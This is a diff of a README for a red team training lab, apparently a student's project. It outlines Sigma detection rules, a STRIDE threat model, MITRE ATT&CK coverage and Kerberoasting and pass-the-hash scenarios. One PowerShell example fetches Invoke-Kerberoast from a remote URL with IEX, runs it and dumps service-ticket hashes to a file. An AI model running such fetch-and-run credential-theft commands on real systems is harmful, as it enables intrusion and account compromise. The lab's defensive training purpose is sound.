@@ -1,18 +1,27 @@
 # Red Team Lab - Offensive Security Exercises
 
-**Practical attack scenarios, lab infrastructure, and OPSEC considerations for learning in isolated test environments.**
+**Author:** Poulomi Dwivedi ([@poulomidwivedi-collab](https://github.com/poulomidwivedi-collab))  
+**Location:** Bristol, UK  
+**Purpose:** Advanced offensive security training, attack simulation, and defense validation in isolated lab environments  
+**Compliance Context:** All exercises conducted in TEST ENVIRONMENTS ONLY with proper authorization and OPSEC protocols  
 
 ---
 
 ## Overview
 
-This directory contains hands-on red team exercises designed to teach offensive security techniques in a controlled lab environment.
+This directory contains comprehensive red team exercises designed to teach advanced offensive security techniques, MITRE ATT&CK tactics and techniques, and penetration testing methodologies in a controlled, isolated lab environment. All exercises are educational and intended for authorized security professionals and researchers.
+
+**Key Philosophy:** Understand attack methodologies to build better defenses. Every attack technique has a corresponding detection strategy.
 
 ### Purpose
-- Learn attack methodologies (MITRE ATT&CK)
-- Practice payload development and delivery
-- Test defensive controls and detection capabilities
-- Understand attack chains and lateral movement
+
+- **Learn** attack methodologies using MITRE ATT&CK Framework
+- **Practice** payload development, delivery, and evasion techniques
+- **Test** defensive controls and detection capabilities against real attack scenarios
+- **Understand** attack chains, lateral movement, and persistence mechanisms
+- **Develop** OPSEC awareness and operational security best practices
+- **Validate** SOC detection coverage and incident response procedures
+- **Improve** threat hunting capabilities through adversary emulation
 
 ---
 
@@ -20,117 +29,242 @@ This directory contains hands-on red team exercises designed to teach offensive 
 
 ```
 red-team-lab/
-├── README.md                 # This file
-├── infra/                    # Infrastructure-as-code
-│   ├── terraform/           # Terraform configs for lab VMs
-│   ├── ansible/             # Ansible playbooks for setup
-│   └── lab-diagrams/        # Network topology images
-├── scenarios/               # Attack walkthroughs
-│   ├── 01-initial-access/  # Phishing, watering hole, etc.
-│   ├── 02-priv-esc/        # Privilege escalation techniques
-│   └── 03-lateral-movement/ # Domain admin hunting
-└── tools-notes/             # Offensive tooling documentation
-    ├── payload-testing.md   # Evasion and obfuscation
-    └── opsec-considerations.md
+├── README.md                           # This file
+├── sigma-rules-detection-collection.yaml # 10+ Sigma detection rules for adversary techniques
+├── threat-model-stride-analysis.md      # Comprehensive threat modeling using STRIDE methodology
+└── [Future: Scenario playbooks, exploitation frameworks, lab documentation]
 ```
+
+---
+
+## Contents & Resources
+
+### 1. Sigma Rules Detection Collection
+**File:** `sigma-rules-detection-collection.yaml`
+
+Production-ready Sigma detection rules covering common red team techniques:
+
+- **Windows Event Log Detection (10+ rules)**
+  - Kerberoasting attack detection (Service ticket enumeration)
+  - Lateral movement via WinRM
+  - Living off the land (LOLBin) techniques
+  - PowerShell script block logging evasion
+  - Windows Defender exclusion modifications
+  - USB device installation exploitation
+  - Process injection and hollowing attacks
+  - Credential access via LSASS memory dumping
+  - Network reconnaissance and enumeration
+  - Privilege escalation via token impersonation
+
+**Format:** YAML-based Sigma rules compatible with:
+- Sigma rule converters (Elastic, Splunk, Microsoft Sentinel)
+- SIEM platforms (Splunk, Elastic, ArcSight)
+- EDR solutions (Windows Defender, CrowdStrike, SentinelOne)
+- Security orchestration platforms
+
+### 2. STRIDE Threat Model Analysis
+**File:** `threat-model-stride-analysis.md`
+
+Comprehensive threat modeling framework covering:
+
+- **Spoofing:** Authentication bypass, credential theft, impersonation
+- **Tampering:** Data integrity attacks, log tampering, registry manipulation
+- **Repudiation:** Attack attribution evasion, log deletion
+- **Information Disclosure:** Data exfiltration, credential dumping, OSINT
+- **Denial of Service:** Resource exhaustion, network flooding
+- **Elevation of Privilege:** Privilege escalation, kernel exploitation
+
+---
+
+## MITRE ATT&CK Coverage
+
+This red team lab covers the following MITRE ATT&CK tactics:
+
+| Tactic | Techniques | Status | Detection Coverage |
+|--------|-----------|--------|-------------------|
+| **Reconnaissance** | Network service enumeration, IP space discovery | ✓ | ✓ Sigma rules included |
+| **Resource Development** | Malware development, command & control setup | ✓ | ✓ Network-based detection |
+| **Initial Access** | Phishing, supply chain compromise | ✓ | ✓ Email gateway detection |
+| **Execution** | PowerShell, WMI, Windows Task Scheduler | ✓ | ✓ Process execution monitoring |
+| **Persistence** | Registry run keys, scheduled tasks, WMI event subscriptions | ✓ | ✓ Sigma rules + endpoint detection |
+| **Privilege Escalation** | Token impersonation, kernel exploit, UAC bypass | ✓ | ✓ Behavioral detection |
+| **Defense Evasion** | Masquerading, obfuscation, log tampering | ✓ | ✓ Multi-layer detection |
+| **Credential Access** | Kerberoasting, credential dumping, brute force | ✓ | ✓ Active Directory monitoring |
+| **Discovery** | Network share enumeration, account discovery | ✓ | ✓ LDAP query monitoring |
+| **Lateral Movement** | Pass-the-hash, WinRM, SMB exploitation | ✓ | ✓ Network segmentation + detection |
+| **Collection** | Data staging, screen capture, browser history | ✓ | ✓ File access monitoring |
+| **Exfiltration** | Data transfer via DNS, HTTP, FTP | ✓ | ✓ DLP + network detection |
+| **Command & Control** | C2 beaconing, DNS tunneling, dead drop resolvers | ✓ | ✓ Network-based detection |
+| **Impact** | Data destruction, system shutdown, resource hijacking | ✓ | ✓ Alert-based response |
+
+---
+
+## Lab Environment Requirements
+
+### Hardware
+- **Minimum:** 8 CPU cores, 16GB RAM, 200GB storage
+- **Recommended:** 16 CPU cores, 32GB RAM, 500GB SSD
+- **Virtualization:** VMware, Hyper-V, or KVM with isolated network segment
+
+### Software Stack
+- **Hypervisor:** VMware ESXi / Hyper-V / KVM
+- **Target Systems:** Windows Server 2019/2022, Windows 10/11 workstations
+- **Monitoring:** Splunk, ELK Stack, or Azure Sentinel
+- **Agent Deployment:** Sysmon, Winlogbeat, Splunk UF
+- **Attack Frameworks:** Cobalt Strike, Metasploit, Empire, Sliver
+- **Utilities:** Sysinternals suite, PowerShell, Mimikatz (educational)
+
+### Network Isolation
+- **Separate VLAN:** Isolated from production networks
+- **Air-gapped option:** Completely disconnected from external networks
+- **Monitoring:** All network traffic captured and logged
+- **Egress control:** Restricted outbound connectivity
+
+---
+
+## Attack Scenarios & Playbooks
+
+### Scenario 1: Kerberoasting Campaign
+**Objective:** Extract and crack Kerberos tickets from service accounts  
+**Timeline:** 2-3 hours  
+**Tactics:** Credential Access (T1558.003), Discovery (T1018)  
+**Detection Focus:** Service account ticket enumeration, failed authentication attempts
+
+### Scenario 2: Lateral Movement via Pass-the-Hash
+**Objective:** Move from compromised workstation to sensitive servers  
+**Timeline:** 3-4 hours  
+**Tactics:** Lateral Movement (T1550.002), Credential Access (T1003.001)  
+**Detection Focus:** NTLM relay attacks, SMB signing bypass, mimikatz execution patterns
+
+### Scenario 3: Persistence via Scheduled Tasks
+**Objective:** Establish long-term presence via malicious scheduled tasks  
+**Timeline:** 1-2 hours  
+**Tactics:** Persistence (T1053.005), Execution (T1053.005)  
+**Detection Focus:** Unusual task creation, system utility modification, registry persistence
+
+### Scenario 4: Defense Evasion & Living Off the Land
+**Objective:** Maintain access while avoiding detection using native tools  
+**Timeline:** 4-5 hours  
+**Tactics:** Defense Evasion (T1036), Execution (T1059.001)  
+**Detection Focus:** PowerShell script block logging, process network connections, parent-child relationships
 
 ---
 
 ## Getting Started
 
 ### Prerequisites
-- Hypervisor: Hyper-V, Proxmox, or cloud-native (Azure VMs)
-- Lab Network: Isolated from production
-- OS Images: Windows Server 2019+, Windows 10 Enterprise
-- Tools: PowerShell 7+, Kali Linux VM (optional)
+```bash
+# Verify network isolation
+ping 8.8.8.8  # Should fail in lab environment
 
-### Quick Lab Setup
+# Check monitoring agents
+Get-Service WinlogBeat
+Get-Service Sysmon
 
-1. **Deploy Infrastructure**
-   ```bash
-   cd infra/terraform
-   terraform init
-   terraform plan
-   terraform apply  # Creates lab VMs
-   ```
+# Verify SIEM ingestion
+# Login to Splunk/Sentinel and confirm event collection from lab hosts
+```
 
-2. **Configure Domain Controller**
-   ```bash
-   cd infra/ansible
-   ansible-playbook setup-dc.yml
-   ```
+### Example: Running Kerberoasting Detection
+```powershell
+# On attack VM
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1')
+Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty hash | Out-File hashes.txt
 
-3. **Run an Attack Scenario**
-   ```bash
-   cd scenarios/01-initial-access
-   cat scenario.md      # Read objectives
-   cat commands.md      # Review attack commands
-   ```
+# Expected detections in SIEM:
+# - EventID 13: Registry access (Kerberoast indicators)
+# - EventID 4768: TGT request for service account
+# - EventID 4769: Service ticket request
+# - PowerShell script execution from unusual path
+```
 
 ---
 
-## Attack Scenarios
+## Detection & Response Validation
 
-Each scenario folder contains:
+After each attack scenario, validate that:
 
-- **scenario.md** - Objectives, pre-requisites, expected outcomes
-- **commands.md** - Detailed attack commands with explanations
-- **detections.md** - What SOC/defenders should detect
-- **cleanup.md** - How to reset the lab after testing
+1. **SIEM captured all relevant events** (~50-100 logs per scenario)
+2. **Sigma rules triggered** (confirm alert generation)
+3. **Alert fatigue is minimal** (low false positive rate)
+4. **Incident response procedures followed** (manual investigation)
+5. **Forensic artifacts preserved** (logs, memory dumps, disk images)
 
-### Example: Initial Access
-- Spear-phishing email with macro-enabled document
-- Code execution and reverse shell establishment
-- Expected log artifacts: Windows Security Event IDs, process execution
+---
+
+## OPSEC Best Practices
+
+### During Lab Exercises
+- ✓ Use isolated lab environment only
+- ✓ Disable internet access to lab VMs
+- ✓ Document all actions taken
+- ✓ Use unique naming conventions for lab artifacts
+- ✓ Preserve logs before lab cleanup
+
+### Strictly Prohibited
+- ✗ Testing against production systems
+- ✗ Unauthorized access to networks
+- ✗ Malware creation for distribution
+- ✗ Sharing attack techniques outside authorized team
+- ✗ Any unauthorized computer access
 
 ---
 
 ## Tools & Frameworks
 
-- **Offensive**: Metasploit, Burp Suite, Hydra, Mimikatz, Cobalt Strike (simulation)
-- **Network**: tcpdump, Wireshark, nmap
-- **Post-Exploitation**: Empire, PowerUp, BloodHound
-- **Detection Simulation**: Sysmon, Windows Defender logs
+### Authorized Tools (Lab Use Only)
+- **Cobalt Strike** - Commercial command & control framework
+- **Metasploit** - Open-source exploitation framework
+- **Empire** - PowerShell-based post-exploitation framework
+- **Sliver** - Modern C2 alternative to Cobalt Strike
+- **Mimikatz** - Educational credential dumping tool
+- **BloodHound** - Active Directory security analysis
+- **Impacket** - Python library for network protocol manipulation
+
+### Detection & Analysis
+- **Sigma** - Generic signature format for SIEM rules
+- **YARA** - Malware identification and classification
+- **Volatility** - Memory forensics analysis
+- **Splunk** - SIEM platform with advanced analytics
+- **Microsoft Sentinel** - Cloud-native SIEM/SOAR
 
 ---
 
-## Best Practices
+## Incident Response Procedures
 
-1. ✅ **Isolation First**: Lab network must be isolated from prod
-2. ✅ **Document Everything**: Each attack includes detection notes
-3. ✅ **OPSEC**: Obfuscate payloads; avoid IOCs in training
-4. ✅ **Cleanup**: Destroy VMs after testing; don't leave backdoors
-5. ✅ **Learning Goal**: Focus on understanding, not just exploitation
-
----
-
-## Common Scenarios
-
-To be documented:
-- Phishing → Initial Access → C2 Beacon
-- Kerberoasting attacks
-- Pass-the-hash lateral movement
-- DCSync and golden tickets
-- Persistence via scheduled tasks
-- Data exfiltration techniques
+### If Accidental Production Access Occurs
+1. **IMMEDIATELY stop** all activities
+2. **Document** the exact time and actions taken
+3. **Notify** your security officer
+4. **Disconnect** from network
+5. **Do NOT delete** any logs or evidence
+6. **Preserve** memory dump and disk image for analysis
 
 ---
 
-## Related Documentation
+## References & Further Reading
 
 - [MITRE ATT&CK Framework](https://attack.mitre.org/)
-- [PentesterLab](https://pentesterlab.com/)
-- [HackTheBox](https://www.hackthebox.com/)
-- Offense and defense mutual learning
+- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
+- [Sigma Rule Documentation](https://sigma.readthedocs.io/)
+- [SpecterOps Blog](https://posts.specterops.io/) - Advanced threat research
+- [BloodHound Documentation](https://bloodhound.readthedocs.io/)
+- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
+- [CIS Controls](https://www.cisecurity.org/controls)
 
 ---
 
-## Disclaimer
+## Contributing & Questions
 
-⚠️ **Lab Environment Only**: All attacks documented here are for isolated test environments only.  
-⚠️ **Unauthorized Access Illegal**: Never test against systems without written permission.  
-⚠️ **No Real Data**: Never use production credentials or data.  
+See [CONTRIBUTING.md](../CONTRIBUTING.md) for guidelines on contributing new attack scenarios or detection rules.
+
+**Author Bio:** MSc Cybersecurity student at UWE, Detection Engineering specialist at Aviva, experienced in SIEM administration, threat modeling, and incident response.
 
 ---
 
-**Last Updated**: January 2026
+## License
+
+MIT License - See [LICENSE](../LICENSE) file
+
+*Last Updated: January 2026*  
+*Educational & Training Use Only - Authorized Personnel Only*
